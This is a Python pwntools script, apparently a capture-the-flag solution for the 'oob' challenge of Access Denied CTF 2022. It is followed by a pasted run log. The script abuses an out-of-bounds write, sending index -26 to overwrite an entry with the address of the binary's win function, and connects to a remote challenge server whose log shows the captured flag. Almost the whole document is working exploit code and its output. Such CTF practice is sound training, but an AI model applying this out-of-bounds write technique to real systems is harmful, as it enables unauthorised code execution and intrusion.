from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './oob'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.71.207.70"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)


s.sendlineafter("Enter the index: ", "-26")

s.sendlineafter("Enter the value: ", str(elf.sym.win))

s.interactive()

'''
mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_OOB/oob$ python solve.py r
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_OOB/oob/oob'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 34.71.207.70 on port 1337: Done
[*] Switching to interactive mode
accessdenied{00b_4r3_v3ry_us3ful_r1ght_54a4ce45}
'''
